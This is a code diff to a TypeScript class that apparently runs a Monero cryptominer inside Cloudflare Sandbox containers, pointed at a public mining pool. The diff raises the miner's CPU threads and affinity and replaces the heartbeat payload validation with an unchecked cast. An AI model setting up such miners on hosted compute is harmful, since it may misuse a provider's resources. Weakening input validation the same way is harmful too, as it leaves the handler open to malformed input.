@@ -1,5 +1,5 @@
 import { Sandbox, ContainerProxy } from "@cloudflare/sandbox";
-import { normalizeHeartbeatPayloads, processHeartbeats } from "./mining-stats";
+import { processHeartbeats } from "./mining-stats";
 
 export { ContainerProxy };
 
@@ -18,9 +18,9 @@ export class MinerSandbox extends Sandbox {
 		MINER_POOL: "pool.supportxmr.com:3333",
 		MINER_TLS: "false",
 		MINER_WORKER_NAME: "cf-sandbox",
-		MINER_THREADS: "4",
+		MINER_THREADS: "7",
 		MINER_CPU_PRIORITY: "5",
-		MINER_CPU_AFFINITY: "0xF",
+		MINER_CPU_AFFINITY: "auto",
 		MINER_RANDOMX_MODE: "fast",
 		MINER_RANDOMX_1GB_PAGES: "true",
 		MINER_RANDOMX_WRMSR: "false",
@@ -31,7 +31,7 @@ export class MinerSandbox extends Sandbox {
 		MINER_DONATE_LEVEL: "0",
 		REPORTER_ENDPOINT: `http://${INTERNAL_HEARTBEAT_HOST}/instances/heartbeat`,
 		REPORTER_INTERVAL: "60",
-		REPORTER_STATS_INTERVAL: "60",
+		REPORTER_STATS_INTERVAL: "60"
 	};
 
 	override async onStart() {
@@ -44,7 +44,7 @@ export class MinerSandbox extends Sandbox {
 				event: "started",
 				id: this.ctx.id.toString(),
 				keepAlive: SANDBOX_KEEP_ALIVE,
-				sleepAfter: this.sleepAfter,
+				sleepAfter: this.sleepAfter
 			}),
 		);
 	}
@@ -56,7 +56,7 @@ export class MinerSandbox extends Sandbox {
 				time: new Date().toISOString(),
 				service: "miner-sandbox",
 				event: "stopped",
-				id: this.ctx.id.toString(),
+				id: this.ctx.id.toString()
 			}),
 		);
 	}
@@ -69,26 +69,26 @@ export class MinerSandbox extends Sandbox {
 				service: "miner-sandbox",
 				event: "error",
 				id: this.ctx.id.toString(),
-				err: String(error),
+				err: String(error)
 			}),
 		);
 	}
 }
 
 (MinerSandbox as unknown as { outboundByHost: Record<string, OutboundHandler> }).outboundByHost = {
-	[INTERNAL_HEARTBEAT_HOST]: heartbeatOutboundHandler,
+	[INTERNAL_HEARTBEAT_HOST]: heartbeatOutboundHandler
 };
 
 type OutboundHandler = (
 	request: Request,
 	env: Env,
-	ctx: { containerId?: string } & Record<string, unknown>,
+	ctx: { containerId?: string } & Record<string, unknown>
 ) => Promise<Response>;
 
 async function heartbeatOutboundHandler(
 	request: Request,
 	env: Env,
-	_ctx: { containerId?: string } & Record<string, unknown>,
+	_ctx: { containerId?: string } & Record<string, unknown>
 ): Promise<Response> {
 	const url = new URL(request.url);
 	let expectedHost: string | null = null;
@@ -119,16 +119,12 @@ async function heartbeatOutboundHandler(
 	if (raw === null || typeof raw !== "object" || Array.isArray(raw)) {
 		return Response.json(
 			{ acknowledged: false, error: "invalid heartbeat body" },
-			{ status: 400 },
+			{ status: 400 }
 		);
 	}
-	const payloads = normalizeHeartbeatPayloads(raw);
-	if (payloads === null) {
-		return Response.json(
-			{ acknowledged: false, error: "invalid heartbeat payload" },
-			{ status: 400 },
-		);
-	}
+	const body = raw as { batch?: unknown[]; [key: string]: unknown };
+
+	const payloads: Array<Record<string, unknown>> = Array.isArray(body.batch) && body.batch.length > 0 ? (body.batch as Array<Record<string, unknown>>) : [body as Record<string, unknown>];
 
 	const cfRay = request.headers.get("CF-Ray") ?? "";
 	const colo = cfRay.split("-")[1] ?? null;
@@ -140,9 +136,9 @@ async function heartbeatOutboundHandler(
 		return Response.json(
 			{
 				acknowledged: false,
-				error: (err as Error).message,
+				error: (err as Error).message
 			},
-			{ status: 500 },
+			{ status: 500 }
 		);
 	}
 }
